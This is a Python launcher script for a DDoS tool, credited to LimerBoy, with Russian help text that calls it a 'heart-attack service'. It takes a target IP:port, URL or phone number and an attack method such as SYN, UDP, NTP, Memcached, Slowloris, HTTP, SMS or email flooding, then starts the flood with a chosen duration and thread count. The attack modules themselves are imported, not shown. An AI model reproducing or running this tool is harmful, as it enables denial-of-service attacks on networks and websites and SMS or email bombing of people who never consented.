# Created by LimerBoy, translated by TofuYa
# Import modules
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Ошибка импорта модулей", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="Сервис вызова инфаркта")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:ПОРТ, URL, ТЕЛЕФОН>",
    help="Целевой ip:порт, url или телефон",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Метод атаки",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<время>", help="время в секундах"
)
parser.add_argument(
    "--threads", type=int, default=3, metavar="<потоки>", help="кол-во потоков (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
